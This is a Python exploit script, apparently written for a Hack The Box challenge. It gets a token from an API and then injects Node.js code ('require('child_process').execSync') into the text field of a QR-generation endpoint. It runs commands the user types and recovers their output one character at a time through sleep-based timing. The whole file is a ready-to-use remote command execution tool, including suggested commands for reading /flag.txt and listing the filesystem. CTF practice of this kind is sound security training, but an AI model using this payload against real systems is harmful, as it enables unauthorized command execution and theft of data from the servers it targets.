import requests
import json
import time

# ================= CONFIG =================
server = "83.136.253.132"
port = 49571
EMAIL = "test@hackthebox.com"

SLEEP_TIME = 3
THRESHOLD = 2.5
RETRY = 2
# =========================================

url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

# get token
headers = {"Content-Type": "application/json"}
data = {"email": EMAIL}
r = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = r.json()["token"]
print("[+] Token OK")

print("\n" + "="*60)
print("COMMAND EXTRACTION TOOL")
print("="*60)
print("\nEnter commands to extract their output.")
print("This will be SLOW but reliable.")
print("\nSuggested commands:")
print("  id                    - Check user")
print("  whoami                - Check username")
print("  pwd                   - Current directory")
print("  ls -la /              - List root")
print("  cat /flag.txt         - Get the flag")
print("="*60)

while True:
    user_input = input("\n> ").strip()
    if user_input.lower() in ['exit', 'quit']:
        break
    if not user_input:
        continue
    
    user_input = user_input.replace("'", '"')
    i = 0
    
    print(f"\nExtracting: {user_input}")
    print("Output: ", end="", flush=True)
    
    while True:
        i += 1
        found = False
        
        # Try uppercase/lowercase letters and numbers first (most common)
        common_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&*()-=+[]|;:,.<>?/ "
        
        for ch in common_chars:
            hits = 0
            
            for _ in range(RETRY):
                payload = {
                    "text": "'}) + require('child_process').execSync('" + 
                            user_input + 
                            " | head -c " + str(i) + 
                            " | tail -c 1 | { read c; if [ \"$c\" = \"" + 
                            ch + 
                            "\" ]; then sleep " + str(SLEEP_TIME) + 
                            "; fi; }')//"
                }
                
                payload_data = json.dumps(payload).replace("\\\\", "\\\\\\")
                headers = {
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {token}"
                }
                
                try:
                    resp = requests.post(qr_endpoint, headers=headers, data=payload_data, timeout=SLEEP_TIME+1)
                    if resp.elapsed.total_seconds() >= THRESHOLD:
                        hits += 1
                except requests.exceptions.Timeout:
                    hits += 1
                except:
                    pass
            
            if hits == RETRY:
                print(ch, end="", flush=True)
                found = True
                break
        
        if not found:
            # Try all ASCII
            for ascii_val in range(32, 127):
                ch = chr(ascii_val)
                if ch in common_chars:  # Skip already tested
                    continue
                    
                hits = 0
                
                for _ in range(RETRY):
                    payload = {
                        "text": "'}) + require('child_process').execSync('" + 
                                user_input + 
                                " | head -c " + str(i) + 
                                " | tail -c 1 | { read c; if [ \"$c\" = \"" + 
                                ch + 
                                "\" ]; then sleep " + str(SLEEP_TIME) + 
                                "; fi; }')//"
                    }
                    
                    payload_data = json.dumps(payload).replace("\\\\", "\\\\\\")
                    headers = {
                        "Content-Type": "application/json",
                        "Authorization": f"Bearer {token}"
                    }
                    
                    try:
                        resp = requests.post(qr_endpoint, headers=headers, data=payload_data, timeout=SLEEP_TIME+1)
                        if resp.elapsed.total_seconds() >= THRESHOLD:
                            hits += 1
                    except requests.exceptions.Timeout:
                        hits += 1
                    except:
                        pass
                
                if hits == RETRY:
                    print(ch, end="", flush=True)
                    found = True
                    break
        
        if not found:
            print(f"\n\n[+] Extraction complete")
            break
    
    print()  # New line